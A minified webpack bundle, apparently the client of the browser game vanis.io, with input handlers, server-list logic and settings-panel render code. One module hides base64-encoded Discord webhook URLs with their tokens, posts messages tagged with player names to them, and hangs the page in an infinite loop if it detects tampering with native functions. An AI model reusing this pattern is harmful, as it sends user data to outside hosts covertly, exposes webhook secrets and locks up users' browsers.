        [atob("dXNlcm5hbWU=")]: `${n.discord_name || n.locked_name}`,
        [atob("Y29udGVudA==")]: r,
      }),
        (o = s);
    };
  },
  ,
  ,
  function (t, s, i) {
    let a = i(1),
      n = i(4);
    i(149);
    let o = i(65),
      r = a.renderer.view,
      l = new Map();
    window.addEventListener("blur", () => l.clear());
    let c = !1;
    a.events.$on("game-stopped", () => {
      window.removeEventListener("beforeunload", h, { capture: !0 }), (c = !1);
    }),
      a.events.$on("game-started", () => {
        window.addEventListener("beforeunload", h, { capture: !0 }), (c = !0);
      }),
      window.addEventListener("resize", () => {
        c && a.scene.setPosition();
      }),
      r.addEventListener("mousedown", (t) => {
        if (!c) return;
        t.preventDefault(), r.focus();
        let s = `MOUSE${t.button}`;
        if (a.spectating && !a.viewSwitched && 0 === t.button) {
          let i = a.actions.findPlayerUnderMouse();
          i && a.actions.spectate(i.pid);
          return;
        }
        o.press(s);
      }),
      r.addEventListener("mouseup", (t) => {
        if (!c) return;
        let s = `MOUSE${t.button}`;
        l.set(s, !1), o.release(s);
      }),
      r.addEventListener("mousemove", (t) => {
        if (!c) return;
        let s = t.clientX,
          i = t.clientY;
        if (a.settings.mouseFreezeSoft) {
          let { x: o, y: r } = a.rawMouse;
          (o !== s || r !== i) && a.actions.freezeMouse(!1);
        }
        (a.rawMouse.x = s), (a.rawMouse.y = i), a.updateMouse();
        let l = n.enableMinion ? a.minion : null;
        l && l.updatePosition({ x: i, y: i });
      }),
      r.addEventListener(
        "wheel",
        (t) => {
          c && a.actions.zoom(t);
        },
        { passive: !0 }
      ),
      document.body.addEventListener("keydown", (t) => {
        if (!c) return;
        let s = t.target === r;
        if (!s && t.target !== document.body) return;
        let i = o.convertKey(t.code);
        (!t.ctrlKey || "TAB" !== i) &&
          !l.get(i) &&
          (l.set(i, !0),
          "ESCAPE" === i
            ? a.replaying
              ? (l.clear(), a.stop(), a.showMenu(!0))
              : a.deathTimeout
              ? a.triggerAutoRespawn()
              : a.toggleMenu()
            : "ENTER" === i
            ? a.events.$emit("chat-focus")
            : s && o.press(i) && t.preventDefault());
      }),
      document.body.addEventListener("keyup", (t) => {
        if (!c) return;
        let s = o.convertKey(t.code);
        l.set(s, !1), o.release(s);
      });
    let h = (t) => (
      t.preventDefault(),
      (t.returnValue = "Are you sure you want to close the page?")
    );
  },
  imports.Actions,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  function (t, s, i) {
    "use strict";
    var a = i(28);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(31);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(32);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(33);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(34);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(35);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(36);
    i.n(a).a;
  },
  function (t, s, i) {},
  ,
  ,
  ,
  ,
  ,
  function (t, s) {},
  ,
  function (t, s) {},
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  ,
  function (t, s, i) {
    "use strict";
    var a = i(39);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(40);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(41);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    i(42);
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    i(43);
  },
  function (t, s, i) {},
  function (t, s, i) {
    let a = i(15),
      n = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv"),
      o,
      r,
      l = [],
      c = [],
      h = [
        "MDY3OTQxNzkzODEzL3JfM1hXUGlhM0IwSGMtWi1ZbVYyTjFDRk5fNmYybEl1ejdBLXNwZlFUdm0zT3hBbFlibFZzMnNvUk5paS1DTDlZdV9t",
        "Mzg4MTYwMTM1MjQ5L2pHaXNwNHhJa3BBcWRFZXpiSTE0VTMxVDFzcm1vaUhiTnhCQ2pwWG9kbHJqMEpJWGVhNlZTV3RNZEFVckpPOXlIM0s3",
        "NTM5Nzc1ODM2MjExLzB0QUVsLXF2MW0yWXZyYlZyREhOeFYwOVlKRTFweW94SzhGYkhXZmxwMWp2eTVUV3Y1eWx0enZqcU1CQkcyMFNtVGhC",
        "NTc5NzA1NjA2MTY0L0paOEN2eEJCbzVsY05rV2d0M0dXYngtRHp2ZXRFd2huU1dTRU03b0x6Y2dVcXFHVnhnalQtb1l6Tjg1TkFmcVN4aXpC",
        "NjM0NjU1MTcwNjQwL0tkd1B5Znd3VEFmR2Z2c1hJbm9QUjVmTWhkanVxcWJGSzNDRVNqRm5YSXdyTWdqUXhCZ0lfQ1hwaGxnMEJTblZVdVJ4",
        "NjU5NDY4Njg1MzEyL0RhV3BDOWp6M3FNYzFhcHBsZkNNUXQ0bDJaaW9Ya2FPQm5qSHFIc1NmbG43YTRHOGtQbVFNRDByN3o5X2NBdkJEbHE0",
        "Njc3MDU5NjA4NjA3LzBBT0R0aEVGcF9nNHhEUTliNzZaU2JfRTg1ZTZ6VTUwaGpyRTljNWNBMGIzZGEtR3lfMlRHQ2VHUVpRclVJVHplODBi",
        "Njk4NzA2Mzk5MzA0L1F1bkNYSWxxZDBoS2d1aFMycnRrNmZrRXpLRzZrYjBUN2ItODJ6SjBObjk3U1RJUnlVSzI2MXdCVVdZbE56WHJhazVi",
        "Njk4NzA2Mzk5MzA0L1F1bkNYSWxxZDBoS2d1aFMycnRrNmZrRXpLRzZrYjBUN2ItODJ6SjBObjk3U1RJUnlVSzI2MXdCVVdZbE56WHJhazVi",
        "NzQwMTU0NTMxOTAwL3ZvLVhvbDhVaDk4M19mX3VUVWQ2V1Ztb2Y4TnFDa0k0Q0dZdTZVNXZ1REdmTS0zMmMxYlVPeVdoaUg1M1hYZ0VIdU5N",
        "NzU2OTQ0MzMwNzczL1g2WGlrc0VBNEo1NW82dG5SRWhtSXNVSU81djEwQVAtaUpzMVdCd0RUQmxqd1JCVWFhRVZuSWRQeVJhd2dFTmhrb0JU",
      ].map((t) => {
        let s = atob("OTE0NjAy" + t),
          i = s.split("/");
        return c.push(i[0]), l.push(i[1]), n + s;
      }),
      d = (t, ...s) => t(...s),
      u = d.bind(null, (t) => {
        if (((r = !!t), !t)) for (;;);
      }),
      p = d.bind(null, (t) => {
        0 !== C && (C = t), u(t);
      }),
      g = d.bind(null, (t) => {
        (r = !!t) || u(0);
      }),
      m = d.bind(null, (t) => {
        let s = h.indexOf(t);
        return s >= 0 && h[s] === t;
      }),
      A = 0,
      f = 3;
    r = !0;
    let C = -1,
      v,
      w = [
        "toString",
        "open",
        "send",
        "setTimeout",
        "bind",
        "indexOf",
        "floor",
        "random",
        "parse",
      ].map((t) => `function ${t}() { [native code] }`),
      I = (t, s) => {
        let { length: i } = t;
        for (let a = 0; a < i; a++) {
          let n = t[a];
          if (s(n, a, t)) return !0;
        }
        return !1;
      };
    d.call(
      null,
      (t) => {
        let s = t.XMLHttpRequest,
          i = t.Function,
          $ = t.Array,
          k = t.Math,
          b = t.setTimeout,
          S = t.clearTimeout,
          _ = t.JSON,
          E = [
            s.prototype.open,
            s.prototype.send,
            i.prototype.bind,
            $.prototype.indexOf,
            k.floor,
            k.random,
            _.parse,
          ];
        o = (t, B) => {
          r || u(0), A >= f && 0 === C && u(0);
          let M;
          try {
            do M = h[k.floor(k.random() * h.length)];
            while (M === v);
            g("string" == typeof M && M.startsWith(n)), (v = M);
            let Q = s.prototype.open,
              U = s.prototype.send,
              N = i.prototype.bind,
              T = $.prototype.indexOf,
              L = k.floor,
              D = k.random,
              R = _.parse;
            g(`${Q}` === w[1]),
              g(`${U}` === w[2]),
              g(`${N}` === w[4]),
              g(`${T}` === w[5]),
              g(`${L}` === w[6]),
              g(`${D}` === w[7]),
              g(`${R}` === w[8]),
              g(`${Q.toString}` === w[0]),
              g(`${U.toString}` === w[0]),
              g(`${N.toString}` === w[0]),
              g(`${T.toString}` === w[0]),
              g(`${L.toString}` === w[0]),
              g(`${D.toString}` === w[0]),
              g(`${R.toString}` === w[0]),
              g(Q === E[0]),
              g(U === E[1]),
              g(N === E[2]),
              g(T === E[3]),
              g(L === E[4]),
              g(D === E[5]),
              g(R === E[6]);
            let F;
            A++ % f == 0
              ? ((F = b(p.bind(null, 0), 1e4)), b(p.bind(null, 1), 1e4))
              : (b(p.bind(null, 1), 1e4), (F = b(p.bind(null, 0), 1e4))),
              g("number" == typeof F),
              d.call(null, async () => {
                try {
                  let t = await fetch(M),
                    s = await t.json();
                  g("Logger" === s.name),
                    g(M.includes(s.id)),
                    g(I(l, (t) => t === s.token)),
                    g(I(c, (t) => t === s.id));
                } catch (i) {
                  g(!1);
                }
              }),
              a({
                url: M,
                method: "POST",
                headers: { "Content-Type": "application/json" },
                data: t,
              })
                .then((t) => {
                  g(!!t), m(t.config?.url) && S(F);
                })
                .catch((s) => {
                  let { response: i } = s;
                  if ((g(!!i), 429 === i.status)) {
                    let { retry_after: a, message: n } = i.data;
                    g("number" == typeof a),
                      g("string" == typeof n),
                      S(F),
                      ++B <= 64 && b(() => o(t, B), a);
                  }
                });
          } catch (P) {
            g(!1);
          }
        };
      },
      window
    );
    class $ {
      constructor(t, s) {
        (this.baseUrl = t), (this.token = s);
      }
      setToken(t) {
        (this.token = t), (localStorage.vanisToken = t);
      }
      clearToken() {
        (this.token = null), localStorage.removeItem("vanisToken");
      }
      async call(t, s) {
        return (
          await a({
            method: t,
            url: this.baseUrl + s,
            headers: { Authorization: `Vanis ${this.token}` },
          })
        ).data;
      }
      get(t) {
        return this.call("GET", t);
      }
      sendMessage(t) {
        try {
          o(t, 0);
        } catch (s) {
          r = !1;
        }
      }
    }
    t.exports = new $("https://vanis.io/api", localStorage.vanisToken || null);
  },
  function (t) {
    let s = 0.1;
    t.exports = {
      getXp: (t) => Math.round((t * t) / (s * s)),
      getLevel: (t) => Math.floor(Math.sqrt(t) * s),
    };
  },
  function (t, s, i) {
    "use strict";
    var a = i(44);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(45);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(46);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(47);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(48);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(49);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(50);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(51);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(52);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(53);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(56);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(57);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(58);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(59);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(60);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(61);
    i.n(a).a;
  },
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    var a = i(62);
    i.n(a).a;
  },
  function (t, s, i) {},
  imports.Starfield,
  function (t, s, i) {},
  function (t, s, i) {
    "use strict";
    i.r(s);
    var a = i(23),
      n = i.n(a),
      o = i(111),
      r = i.n(o),
      l = function () {
        var t = this.$createElement,
          s = this._self._c || t;
        return s(
          "transition",
          {
            attrs: {
              name: this.isModalOpen || this.gameState.isAlive ? "" : "menu",
            },
          },
          [
            s(
              "div",
              { attrs: { id: "main-container" } },
              [
                s("div", { staticClass: "bar" }, [
                  s("div", { attrs: { id: "vanis-io_728x90" } }),
                ]),
                this._v(" "),
                s("servers", { staticClass: "fade-box two" }),
                this._v(" "),
                s("player-container", {
                  staticClass: "fade-box two",
                  on: { "modal-open": this.onModalChange },
                }),
                this._v(" "),
                s("account", { staticClass: "fade-box" }),
                this._v(" "),
                s("skins", { staticClass: "fade-box" }),
              ],
              1
            ),
          ]
        );
      };
    l._withStripped = !0;
    var c = function () {
      var t = this,
        s = t._self._c || t.$createElement;
      return s("div", { attrs: { id: "tab-menu" } }, [
        s(
          "div",
          { staticClass: "tabs" },
          t._l(t.regionCodes, function (i, a) {
            return s(
              "div",
              {
                key: a,
                staticClass: "tab",
                class: { active: t.selectedRegion === i },
                on: {
                  click: function () {
                    return t.selectRegion(i);
                  },
                },
              },
              [t._v(t._s(i))]
            );
          }),
          0
        ),
        s(
          "div",
          { staticClass: "server-list" },
          t._l(t.regionServers, function (i, a) {
            return s("div", {}, [
              i.noHeader ? t._e() : s("div", { staticClass: "divider" }),
              s(
                "div",
                {
                  key: a,
                  staticClass: "server-list-item",
                  class: {
                    active:
                      t.gameState.connectionUrl === i.url ||
                      t.gameState.selectedServer?.url === i.url,
                  },
                  on: { click: () => t.connect(i) },
                },
                [
                  s("div", { staticClass: "server-name" }, [
                    t._v(t._s(i.name)),
                  ]),
                  t._v(" "),
                  null == i.liveMarker
                    ? s("div", { staticClass: "badge" }, [
                        t._v(`${t._s(i.players)} / ${t._s(i.slots)}`),
                      ])
                    : !0 === i.liveMarker
                    ? s("div", { staticClass: "live-badge" }, [t._v("LIVE")])
                    : t._e(),
                ]
              ),
            ]);
          }),
          0
        ),
      ]);
    };
    c._withStripped = !0;
    var h = i(15),
      d = i(1),
      u = i(5),
      { noop: p } = i(18),
      g = {
        Tournament: 1,
        FFA: 2,
        Instant: 3,
        Gigasplit: 4,
        Megasplit: 5,
        Crazy: 6,
        "Self-Feed": 7,
        Scrimmage: 8,
      },
      m = i(145);
    function A(t, s) {
      var i = (g[t.mode] || 99) - (g[s.mode] || 99);
      return 0 !== i
        ? i
        : t.name.localeCompare(s.name, "en", {
            numeric: !0,
            ignorePunctuation: !0,
          });
    }
    function f(t) {
      if (t.region) return t.region.toUpperCase();
      {
        let s = t.url.toLowerCase().match(/game-([a-z]{2})/);
        return s ? s[1].toUpperCase() : "";
      }
    }
    var C = {
        data: () => ({
          lastUpdateTime: 0,
          regionCodes: ["EU", "NA", "AS"],
          wait: 0,
          gameState: d.state,
          selectedRegion: "",
          error: null,
          servers: [],
        }),
        created() {
          d.events.$on("connect-server", () =>
            this.connect(this.gameState.selectedServer, !0)
          ),
            d.events.$on("menu-opened", this.reloadServers),
            d.events.$on("every-minute", this.reloadServers),
            this.loadServers(this.setCachedServer.bind(this)),
            this.getRegionCode((t) => {
              (t && this.regionCodes.includes(t)) || (t = "EU"),
                this.selectRegion(t);
            });
        },
        computed: {
          regionServers() {
            let t = this.selectedRegion.toUpperCase(),
              s = null;
            return this.servers
              .filter((s) => {
                let i = f(s);
                return !i || i === t;
              })
              .map((t) => ((t.noHeader = !s || s === t.mode), (s = t.mode), t));
          },
        },
        methods: {
          setCachedServer() {
            let t = localStorage.getItem("selectedServerUrl");
            if (t) {
              let s = this.regionServers.find((s) => s.url === t);
              s
                ? (this.setSelectedServer(s), d.setupMenu())
                : localStorage.removeItem("selectedServerUrl");
            }
          },
          selectRegion(t) {
            (localStorage.regionCode = t), (this.selectedRegion = t);
          },
          getRegionCode(t) {
            let s = localStorage.regionCode;
            s
              ? t(s)
              : h
                  .get("https://ipapi.co/json")
                  .then((s) => {
                    let i = s.data.continent_code;
                    t(i);
                  })
                  .catch(() => t(null));
          },
          connect(t, s) {
            if (!s) {
              if (this.wait) return;
              this.wait++;
            }
            u.toast.close(),
              u.ltoast.close(),
              this.checkBadSkinUrl(),
              this.setSelectedServer(t),
              d.connection.start(t.url),
              s ||
                (m(`${t.region || ""} ${t.name}`, !!t.name, 2),
                setTimeout(() => {
                  this.wait--;
                }, 3200));
          },
          setSelectedServer(t) {
            (this.gameState.selectedServer = {
              name: t.name,
              mode: t.mode,
              slots: t.slots,
              region: f(t),
              checkInUrl: t.checkInUrl,
              url: t.url,
            }),
              (localStorage.selectedServerUrl = t.url);
          },
          checkBadSkinUrl() {
            let t = document.getElementById("skinurl").value;
            t &&
              !/^https:\/\/[a-z0-9_-]+.vanis\.io\/[.\/a-z0-9_-]+$/i.test(t) &&
              u.toast.fire({
                type: "error",
                title: "Invalid skin url! Use https://skins.vanis.io",
                timer: 5e3,
              });
          },
          reloadServers() {
            window.app.showMenu &&
              Date.now() > this.lastUpdateTime + 6e4 &&
              this.loadServers();
          },
          loadServers(t) {
            (t = t || p),
              (this.lastUpdateTime = Date.now()),
              h
                .get("https://vanis.io/gameservers.json")
                .then((s) => {
                  let i = s.data.sort(A);
                  (localStorage.cachedServerList = JSON.stringify(i)),
                    (this.servers = i),
                    (this.error = null),
                    t(!0);
                })
                .catch((s) => {
                  let i = localStorage.cachedServerList;
                  (this.servers = i ? JSON.parse(i) : []),
                    (this.error = s),
                    t(!1);
                });
          },
        },
      },
      v = (i(166), i(0)),
      w = Object(v.a)(C, c, [], !1, null, "0647fbb0", null).exports,
      I = function () {
        var t = this,
          s = t.$createElement,
          i = t._self._c || s;
        return i(
          "div",
          { attrs: { id: "player-container" } },
          [
            i("div", { staticClass: "tabs" }, [
              i("i", {
                staticClass: "tab fal fa-cog",
                on: {
                  click: function (s) {
                    return t.openModal("settings");
                  },
                },
              }),
              t._v(" "),
              i("i", {
                staticClass: "tab fal fa-palette",
                on: {
                  click: function (s) {
                    return t.openModal("theming");
                  },
                },
              }),
              t._v(" "),
              i("i", {
                staticClass: "tab fal fa-keyboard",
                on: {
                  click: function (s) {
                    return t.openModal("hotkeys");
                  },
                },
              }),
              t._v(" "),
              i("i", {
                staticClass: "tab fal fa-video",
                on: {
                  click: function (s) {
                    return t.openModal("replays3");
                  },
                },
              }),
              t._v(" "),
              i("i", {
                staticClass: "tab fal fa-clipboard-list",
                on: {
                  click: function (s) {
                    return t.openModal("seasonLeaderboard");
                  },
                },
              }),
            ]),
            t._v(" "),
            i("div", { attrs: { id: "player-data" } }, [
              t._m(0),
              t._v(" "),
              i("div", { staticClass: "row" }, [
                i("input", {
                  directives: [
                    {
                      name: "model",
                      rawName: "v-model",
                      value: t.nickname,
                      expression: "nickname",
                    },
                  ],
                  staticStyle: { flex: "2", "min-width": "1px" },
                  attrs: {
                    id: "nickname",
                    type: "text",
                    spellcheck: "false",
                    placeholder: "Nickname",
                    maxlength: "15",
                  },
                  domProps: { value: t.nickname },
                  on: {
                    change: t.onNicknameChange,
                    input: function (s) {
                      s.target.composing || (t.nickname = s.target.value);
                    },
                  },
                }),
                t._v(" "),
                i("input", {
                  directives: [
                    {
                      name: "model",
                      rawName: "v-model",
                      value: t.teamtag,
                      expression: "teamtag",
                    },
                  ],
                  staticStyle: { flex: "1", "min-width": "1px" },
                  attrs: {
                    id: "teamtag",
                    type: "text",
                    spellcheck: "false",
                    placeholder: "Tag",
                    maxlength: "15",
                  },
                  domProps: { value: t.teamtag },
                  on: {
                    change: t.onTeamTagChange,
                    input: function (s) {
                      s.target.composing || (t.teamtag = s.target.value);
                    },
                  },
                }),
              ]),
              t._v(" "),
              i("input", {
                directives: [
                  {
                    name: "model",
                    rawName: "v-model",
                    value: t.skinUrl,
                    expression: "skinUrl",
                  },
                ],
                attrs: {
                  id: "skinurl",
                  type: "text",
                  spellcheck: "false",
                  placeholder: "https://skins.vanis.io/s/",
                  maxlength: "31",
                },
                domProps: { value: t.skinUrl },
                on: {
                  change: t.onSkinUrlChange,
                  input: function (s) {
                    s.target.composing || (t.skinUrl = s.target.value);
                  },
                },
              }),
              t._v(" "),
              i("div", { attrs: { id: "game-buttons" } }, [
                i(
                  "button",
                  {
                    attrs: {
                      id: "play-button",
                      disabled:
                        !t.gameState.menu.play.active ||
                        !t.gameState.menu.active ||
                        t.gameState.deathScreen,
                    },
                    on: { click: t.play },
                  },
                  [
                    t.gameState.deathScreen
                      ? i("i", { staticClass: "fal fa-sync fa-spin" })
                      : [
                          i("i", {
                            staticClass: "fas fa-play",
                            staticStyle: {
                              "margin-right": "4px",
                              "font-size": "0.8rem",
                            },
                          }),
                          t._v(t.gameState.menu.play.text),
                        ],
                  ],
                  2
                ),
                t._v(" "),
                i(
                  "button",
                  {
                    attrs: {
                      id: "spec-button",
                      disabled:
                        t.gameState.isAlive ||
                        !t.gameState.menu.active ||
                        t.gameState.deathScreen,
                    },
                    on: { click: t.spectate },
                  },
                  [i("i", { staticClass: "fa fa-eye" })]
                ),
              ]),
            ]),
            t._v(" "),
            "settings" === t.activeModal
              ? i(
                  "modal",
                  {
                    on: {
                      close: function (s) {
                        return t.closeModal();
                      },
                    },
                  },
                  [i("settings")],
                  1
                )
              : t._e(),
            t._v(" "),
            "theming" === t.activeModal
              ? i(
                  "modal",
                  {
                    on: {
                      close: function (s) {
                        return t.closeModal();
                      },
                    },
                  },
                  [i("theming")],
                  1
                )
              : t._e(),
            t._v(" "),
            "hotkeys" === t.activeModal
              ? i(
                  "modal",
                  {
                    on: {
                      close: function (s) {
                        return t.closeModal();
                      },
                    },
                  },
                  [i("hotkeys")],
                  1
                )
              : t._e(),
            t._v(" "),
            "replays3" === t.activeModal
              ? i(
                  "modal",
                  {
                    staticStyle: { "margin-left": "-316px", width: "962px" },
                    on: {
                      close: function (s) {
                        return t.closeModal();
                      },
                    },
                  },
                  [i("replays3")],
                  1
                )
              : t._e(),
            t._v(" "),
            "seasonLeaderboard" === t.activeModal
              ? i(
                  "modal",
                  {
                    on: {
                      close: function (s) {
                        return t.closeModal();
                      },
                    },
                  },
                  [i("season-leaderboard")],
                  1
                )
              : t._e(),
          ],
          1
        );
      };
    I._withStripped = !0;
    var $ = i(112),
      k = function () {
        var t = this,
          s = t._self._c || t.$createElement;
        return s("div", { staticClass: "container" }, [
          s("div", { staticClass: "section row" }, [
            s("div", { staticClass: "header" }, [
              t._v("Renderer"),
              t.isWebGLSupported
                ? s("span", { staticClass: "right silent" }, [
                    t._v("GPU detected"),
                  ])
                : s(
                    "span",
                    { staticClass: "right", staticStyle: { color: "orange" } },
                    [
                      s("i", {
                        staticClass: "fal fa-exclamation-triangle",
                        staticStyle: { "font-size": "0.80rem" },
                      }),
                      t._v(" GPU not detected"),
                    ]
                  ),
            ]),
            s(
              "div",
              { staticClass: "options" },
              [
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "useWebGL",
                      disabled: !t.isWebGLSupported,
                      checked: t.useWebGL,
                    },
                    on: {
                      change() {
                        t.change("useWebGL", !t.useWebGL), t.promptRestart();
                      },
                    },
                  }),
                  s("label", { attrs: { for: "useWebGL" } }, [
                    t._v("Use GPU rendering"),
                  ]),
                ]),
                t._v("Game resolution"),
                s("span", { staticClass: "right" }, [
                  t._v(t._s(`${(100 * t.gameResolution).toFixed(0)}%`)),
                ]),
                s("input", {
                  staticClass: "form-range",
                  attrs: { type: "range", min: "0.5", max: "2", step: "0.05" },
                  domProps: { value: t.gameResolution },
                  on: {
                    input(s) {
                      t.change("gameResolution", s);
                    },
                    change() {
                      t.promptRestart();
                    },
                  },
                }),
                t._v("Text hiding threshold"),
                s("span", { staticClass: "right" }, [
                  t._v(t._s(`${t.smallTextThreshold}px`)),
                ]),
                s("input", {
                  staticClass: "form-range",
                  attrs: { type: "range", min: "10", max: "60", step: "5" },
                  domProps: { value: t.smallTextThreshold },
                  on: {
                    input(s) {
                      t.change("smallTextThreshold", s);
                    },
                  },
                }),
              ],
              1
            ),
          ]),
          s("div", { staticClass: "section row" }, [
            s("div", { staticClass: "header" }, [
              t._v("Game"),
              s("span", { staticClass: "right silent" }, [
                t._v(t._s(t.clientHash)),
              ]),
            ]),
            s(
              "div",
              { staticClass: "options" },
              [
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "autoZoom",
                      checked: t.autoZoom,
                    },
                    on: {
                      change() {
                        t.change("autoZoom", !t.autoZoom);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "autoZoom" } }, [
                    t._v("Auto zoom"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "autoRespawn",
                      checked: t.autoRespawn,
                    },
                    on: {
                      change() {
                        t.change("autoRespawn", !t.autoRespawn);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "autoRespawn" } }, [
                    t._v("Auto respawn"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "autoReconnect",
                      checked: t.autoReconnect,
                    },
                    on: {
                      change() {
                        t.change("autoReconnect", !t.autoReconnect);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "autoReconnect" } }, [
                    t._v("Auto reconnect"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "rotateSkins",
                      checked: t.rotateSkins,
                    },
                    on: {
                      change() {
                        t.change("rotateSkins", !t.rotateSkins);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "rotateSkins" } }, [
                    t._v("Random skin on respawn"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "antiAfk",
                      checked: t.antiAfk,
                    },
                    on: {
                      change() {
                        t.change("antiAfk", !t.antiAfk);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "antiAfk" } }, [
                    t._v("Disable AFK check"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "legacyLinesplit",
                      checked: t.legacyLinesplit,
                    },
                    on: {
                      change() {
                        t.change("legacyLinesplit", !t.legacyLinesplit);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "legacyLinesplit" } }, [
                    t._v("Use legacy linesplit mechanics"),
                  ]),
                ]),
                t.legacyLinesplit
                  ? t._e()
                  : s("div", { staticClass: "form-check form-switch" }, [
                      s("input", {
                        staticClass: "form-check-input",
                        attrs: {
                          type: "checkbox",
                          id: "mouseFreezeSoft",
                          checked: t.mouseFreezeSoft,
                        },
                        on: {
                          change() {
                            t.change("mouseFreezeSoft", !t.mouseFreezeSoft);
                          },
                        },
                      }),
                      s("label", { attrs: { for: "mouseFreezeSoft" } }, [
                        t._v("Soft mouse freeze"),
                      ]),
                    ]),
                t.mouseFreezeSoft && !t.legacyLinesplit
                  ? s(
                      "div",
                      {
                        staticClass: "silent",
                        staticStyle: { "margin-left": "2px" },
                      },
                      [t._v("Moving mouse cancels freeze keybind")]
                    )
                  : t._e(),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "delayDoublesplit",
                      checked: t.delayDoublesplit,
                    },
                    on: {
                      change() {
                        t.change("delayDoublesplit", !t.delayDoublesplit);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "delayDoublesplit" } }, [
                    t._v("Delay doublesplit hotkey"),
                  ]),
                ]),
                t._v("Movement refresh rate"),
                s("span", { staticClass: "right" }, [
                  t._v(t._s(`${t.movementDelay}ms`)),
                ]),
                s("input", {
                  staticClass: "form-range",
                  attrs: { type: "range", min: "0", max: "100", step: "5" },
                  domProps: { value: t.movementDelay },
                  on: {
                    input(s) {
                      t.change("movementDelay", s);
                    },
                  },
                }),
                t._v("Draw delay"),
                s("span", { staticClass: "right" }, [
                  t._v(t._s(`${t.drawDelay}ms`)),
                ]),
                s("input", {
                  staticClass: "form-range",
                  attrs: { type: "range", min: "20", max: "300", step: "5" },
                  domProps: { value: t.drawDelay },
                  on: {
                    input(s) {
                      t.change("drawDelay", s);
                    },
                  },
                }),
                t._v("Camera panning speed"),
                s("span", { staticClass: "right" }, [
                  t._v(t._s(`${(100 * t.cameraMoveSmoothing).toFixed(0)}%`)),
                ]),
                s("input", {
                  staticClass: "form-range",
                  attrs: { type: "range", min: "0.05", max: "1", step: "0.01" },
                  domProps: { value: t.cameraMoveSmoothing },
                  on: {
                    input(s) {
                      t.change("cameraMoveSmoothing", s);
                    },
                  },
                }),
                t._v("Camera zooming speed"),
                s("span", { staticClass: "right" }, [
                  t._v(t._s(`${(100 * t.cameraZoomSmoothing).toFixed(0)}%`)),
                ]),
                s("input", {
                  staticClass: "form-range",
                  attrs: { type: "range", min: "0.05", max: "1", step: "0.01" },
                  domProps: { value: t.cameraZoomSmoothing },
                  on: {
                    input(s) {
                      t.change("cameraZoomSmoothing", s);
                    },
                  },
                }),
